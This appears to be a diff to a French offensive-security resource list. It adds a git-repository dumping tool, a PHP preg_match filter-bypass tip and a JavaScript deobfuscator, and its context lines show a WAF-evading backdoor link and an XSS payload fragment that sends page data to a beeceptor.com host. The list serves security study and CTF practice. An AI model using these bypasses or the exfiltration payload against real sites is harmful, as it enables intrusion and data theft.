@@ -19,6 +19,7 @@
 - [Wappalyzer](https://addons.mozilla.org/fr/firefox/addon/wappalyzer/)
 - [ProtonPass](https://proton.me/fr/pass/download)
 - [Ublock](https://addons.mozilla.org/fr/firefox/addon/ublock-origin/)
+- [DotGit](https://github.com/davtur19/DotGit) **avec** https://github.com/arthaud/git-dumper
 
 ### Burp
 
@@ -59,6 +60,8 @@ https://excess-xss.com/
   - https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/
 
 ### PHP
+
+  - **Bypass `preg_match(" | _/")`** : `.`, ou `]` ou encore d'autres caractères peuvent remplacer `_`:  https://ctftime.org/writeup/11535 
   - `Type Juggling` https://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdf
   - `Eval` https://www.defenxor.com/blog/writing-simple-php-non-alphanumeric-backdoor-to-evade-waf/
 
@@ -107,6 +110,7 @@ https://vulnerable.org?parameter=<img src="//night.free.beeceptor.com?data=".con
 ## Obfu
 
 - https://obf-io.deobfuscate.io/
+- https://js.retn0.kr/
 
 ## Exercices
 
